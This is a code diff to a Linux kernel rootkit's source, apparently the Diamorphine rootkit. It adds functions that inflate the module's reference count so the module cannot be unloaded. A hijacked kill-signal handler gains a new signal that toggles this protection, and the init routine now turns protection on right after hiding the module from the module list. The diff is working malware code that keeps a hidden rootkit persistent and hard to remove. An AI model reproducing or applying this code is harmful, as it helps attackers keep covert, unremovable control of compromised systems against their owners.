@@ -300,6 +300,8 @@ tidy(void)
 
 static struct list_head *module_previous;
 static short module_hidden = 0;
+static short module_protected = 0;
+
 void
 module_show(void)
 {
@@ -313,6 +315,24 @@ module_hide(void)
 	module_previous = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
 	module_hidden = 1;
+}
+
+void
+module_protect(void)
+{
+	atomic_t *p_ref_count = &THIS_MODULE->refcnt;
+
+	atomic_set(p_ref_count, 0x8163);
+	module_protected = 1;
+}
+
+void
+module_unprotect(void)
+{
+	atomic_t *p_ref_count = &THIS_MODULE->refcnt;
+
+	atomic_set(p_ref_count, 1);
+	module_protected = 0;
 }
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -344,6 +364,10 @@ hacked_kill(pid_t pid, int sig)
 		case SIGMODINVIS:
 			if (module_hidden) module_show();
 			else module_hide();
+			break;
+		case SIGPROTECT:
+			if (module_protected) module_unprotect();
+			else module_protect();
 			break;
 		default:
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
@@ -414,6 +438,7 @@ diamorphine_init(void)
 #endif
 
 	module_hide();
+	module_protect();
 	tidy();
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
